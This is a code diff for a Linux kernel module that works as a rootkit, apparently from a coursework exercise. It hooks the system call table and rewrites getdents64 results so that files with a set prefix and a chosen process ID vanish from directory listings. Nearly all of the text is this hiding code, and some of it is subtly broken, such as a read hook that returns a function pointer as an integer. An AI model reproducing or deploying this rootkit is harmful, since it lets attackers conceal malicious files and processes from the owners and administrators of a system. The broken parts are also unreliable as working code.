@@ -14,6 +14,18 @@
 // This is a pointer to the system call table
 static unsigned long *sys_call_table;
 
+MODULE_LICENSE("GPL");
+char *sneaky_pid = "";
+module_param(sneaky_pid, charp, 0000);
+MODULE_PARM_DESC(sneaky_pid, "sneaky_pid");
+
+struct linux_dirent64 {
+	unsigned long	d_ino;
+	unsigned long	d_off;
+	unsigned short	d_reclen; 
+	char		d_name[]; 
+};
+
 // Helper functions, turn on and off the PTE address protection mode
 // for syscall_table pointer
 int enable_page_rw(void *ptr)
@@ -66,18 +78,18 @@ asmlinkage int sneaky_sys_getdents64(unsigned int fd, struct linux_dirent64 *dir
   }
   char *file = (char *)dirp;
 
-  for (in i = 0; i < og_num;i++)
+  int i;
+  for (i = 0; i < og_num;)
   {
-    struct linux_dirent64 *curr_dirp = (struct linux_dirents64 *)(file + i);
-    if (strncmp(curr_dirp->d_name, PREFIX, strlen(PREFIX)) == 0)
+    struct linux_dirent64 *curr_dirp = (struct linux_dirent64 *)(file + i);
+    if (strncmp(curr_dirp->d_name, PREFIX, strlen(PREFIX)) == 0 ||strcmp(curr_dirp->d_name, sneaky_pid) == 0)
     {
       printk(KERN_INFO "Sneaky_process being hide.\n");
-      memmove((char *)file + i, (char *)file + i + curr_dirp->d_reclen, og_num - (i + curr_dirp->reclen));
+      memmove((char *)file + i, (char *)file + i + curr_dirp->d_reclen, og_num - (i + curr_dirp->d_reclen));
+      og_num -= curr_dirp->d_reclen;
     }
-    if (strcmp(curr_dirp->d_name, sneaky_pid) == 0)
-    {
-      printk(KERN_INFO "Sneaky pid directory being hide.\n");
-      memmove((char *)file + i, (char *)file + i + curr_dirp->d_reclen, og_num - (i + curr_dirp->reclen));
+    else{
+      i+=curr_dirp->d_reclen;
     }
   }
   return og_num;
@@ -86,10 +98,10 @@ asmlinkage int sneaky_sys_getdents64(unsigned int fd, struct linux_dirent64 *dir
 //--------read-----------//
 asmlinkage int (*original_read)(unsigned int fd, void *buf, size_t count);
 
-asmlinkage int sneaky_sys_read(unsigned int fd, void *buf, size_t count){
+asmlinkage int sneaky_sys_read(unsigned int fd, void *buf, size_t count)
+{
   return original_read;
 }
-
 
 // The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
@@ -142,7 +154,3 @@ static void exit_sneaky_module(void)
 
 module_init(initialize_sneaky_module); // what's called upon loading
 module_exit(exit_sneaky_module);       // what's called upon unloading
-MODULE_LICENSE("GPL");
-char *sneaky_pid = "";
-module_param(sneaky_pid, charp, 0000);
-MODULE_PARM_DESC(sneaky_pid, "sneaky_pid");
